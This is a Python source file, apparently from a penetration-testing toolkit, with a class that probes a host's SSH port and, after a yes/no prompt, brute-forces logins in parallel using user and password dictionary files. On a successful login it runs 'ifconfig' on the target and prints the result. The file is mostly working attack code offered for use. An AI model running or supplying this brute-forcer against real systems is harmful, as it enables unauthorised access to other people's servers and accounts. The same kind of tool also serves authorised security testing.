#!/usr/bin/env python
import concurrent.futures as cf
import pathlib
import socket

from lib.utils import Colors
import paramiko


class SshConnector:

    def __init__(self):
        self.ssh = paramiko.SSHClient()
        self.prj_dir = pathlib.Path(__file__).parent.parent.parent
        self.dict_dir = self.prj_dir / "data" / "dict"

    def ssh_auth(self, ip, user, password) -> dict:
        self.ssh.load_system_host_keys()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            self.ssh.connect(ip, port=22, username=user, password=password,
                             timeout=5, auth_timeout=5, banner_timeout=5)
            print("[+] Login {}/{} {}success{}".format(user, password, Colors.LIGHTGREEN, Colors.END))
            stdin, stdout, stderr = self.ssh.exec_command("ifconfig")
            for line in stdout.readlines():
                print(line.strip())
            self.ssh.close()
            return {"User": user, "Pass": password, "Login": True}

        except paramiko.AuthenticationException:
            self.ssh.close()
            print("[-] Login {}/{} {}incorrect{}".format(user, password, Colors.RED, Colors.END))
            return {"User": user, "Pass": password, "Login": False}

        except socket.error:
            print("[*] Connection could not be established to {}".format(ip))
            return {"User": user, "Pass": password, "Login": False}

    def ssh_brute_force(self, host):
        try:
            users_file = self.dict_dir / "users"
            passwords_file = self.dict_dir / "passwords"

            with users_file.open() as u:
                user_text = u.read().splitlines()

            with passwords_file.open() as p:
                password_text = p.read().splitlines()

            results_list = []
            try:
                with cf.ProcessPoolExecutor(max_workers=4) as executor:
                    for user in user_text:
                        results = {executor.submit(self.ssh_auth, host, user, password): password for password in
                                   password_text}

                        for future in cf.as_completed(results):
                            if future.result():
                                results_list.append(future.result())

            except Exception as err:
                print("[!] {}".format(err))
                pass

        except Exception as err:
            print("[!] {}".format(err))
            pass

    def ssh_connect(self, host):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 22))
            sock.close()
            if result == 0:
                print("SSH 22/tcp {}OPEN{}".format(Colors.LIGHTGREEN, Colors.END))
                response = input("[*] Would you like start bru73 f0rc3 to {} ? [y/N]".format(host))
                if response in ['y', 'ye', 'yes']:
                    self.ssh_brute_force(host)
            else:
                print("SSH 22/tcp {}CLOSED{}".format(Colors.RED, Colors.END))
        except KeyError:
            print("[!] Error checking ports!")
            pass
        except socket.gaierror:
            print("[!] Hostname could not be resolved.")
        except socket.error:
            print("[!] Couldn't connect to server")
